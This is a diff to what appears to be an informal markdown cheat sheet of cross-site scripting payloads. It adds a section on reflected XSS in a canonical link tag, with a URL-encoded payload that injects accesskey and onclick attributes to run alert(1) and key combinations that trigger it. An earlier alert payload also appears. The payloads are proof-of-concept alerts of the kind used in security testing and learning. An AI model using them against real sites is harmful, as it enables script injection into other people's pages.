@@ -201,9 +201,30 @@ so i am useing These Script
      \'-alert(1)//
      
      
-     
-     
+  ## 8. Reflected XSS in canonical link tag
   
+  Visit the following URL, add paylods in url like
+  
+    example.com/?%27accesskey=%27x%27onclick=%27alert(1)
+    
+ Add paylods in url like 
+ 
+    ?%27accesskey=%27x%27onclick=%27alert(1)
+    
+ And Enter 
+ 
+ To trigger the exploit on yourself, press one of the following key combinations: 
+ 
+    On Windows: ALT+SHIFT+X
+    
+    On MacOS: CTRL+ALT+X
+    
+    On Linux: Alt+X
+    
+ Show The opoop
+ 
+  
+    
   
   
   
